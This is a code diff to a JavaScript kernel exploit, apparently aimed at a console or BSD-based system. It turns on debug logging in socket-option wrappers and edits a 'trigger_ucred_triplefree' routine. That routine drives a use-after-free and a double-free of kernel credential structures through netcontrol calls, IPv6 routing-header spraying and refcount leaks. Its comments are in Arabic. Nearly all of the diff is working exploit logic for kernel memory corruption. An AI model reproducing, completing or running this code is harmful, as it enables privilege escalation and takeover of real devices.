@@ -220,11 +220,11 @@ function set_sockopt(sd, level, optname, optval, optlen) {
 var real_set_sockopt = set_sockopt;
 
 set_sockopt = function(sd, level, optname, optval, optlen) {
-  //log("[SETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen=" + optlen);
+  log("[SETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen=" + optlen);
 
   var ret = real_set_sockopt(sd, level, optname, optval, optlen);
 
-  //log("[SETSOCKOPT] AFTER ret=" + ret);
+  log("[SETSOCKOPT] AFTER ret=" + ret);
 
   return ret;
 };
@@ -256,12 +256,12 @@ var real_get_sockopt = get_sockopt;
 
 get_sockopt = function(sd, level, optname, optval, optlen) {
   write32(sockopt_len_ptr, optlen);
-  //log("[GETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen_in=" + optlen);
+  log("[GETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen_in=" + optlen);
 
   var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
 
   var out_len = read32(sockopt_len_ptr);
-  //log("[GETSOCKOPT] AFTER result=" + result + " out_len=" + out_len);
+  log("[GETSOCKOPT] AFTER result=" + result + " out_len=" + out_len);
 
   if (result.eq(BigInt_Error)) {
     throw new Error('get_sockopt error: ' + hex(result));
@@ -1447,7 +1447,6 @@ function trigger_ucred_triplefree() {
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
     write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
     nc_call(NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-
     close(new BigInt(dummy_socket));
 
     // 2) allocate new ucred
@@ -1462,6 +1461,7 @@ function trigger_ucred_triplefree() {
     // 5) unregister → free file + ucred
     write32(nc_clear_buf, uaf_socket);
     nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
+
     // 6) refcount fix loop
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
@@ -1470,12 +1470,6 @@ function trigger_ucred_triplefree() {
       read(new BigInt(iov_sock_0), tmp, 1);
     }
     log("[TRIGGER] step 6 done");
-
-    // 🔍 refcount قبل أي double-free (على sock 0 كـ عينة)
-    write32(leak_rthdr.add(0x04), 0);
-    get_rthdr(ipv6_socks[0], leak_rthdr, 0x20);
-    var pre_ref = read32(leak_rthdr);
-    log("[TRIGGER] pre-doublefree refcount(sock0)=" + pre_ref);
 
     // 7) first double-free
     log("[TRIGGER] step 7: first double-free via dup(uaf_socket)");
@@ -1500,7 +1494,7 @@ function trigger_ucred_triplefree() {
     // 9) free one twin
     free_rthdr(ipv6_socks[twins[1]]);
 
-    // 🔍 refcount بعد free التوأم
+    // 🔍 refcount بعد free التوأم (ده المكان الصح)
     write32(leak_rthdr.add(0x04), 0);
     get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 0x20);
     var mid_ref = read32(leak_rthdr);
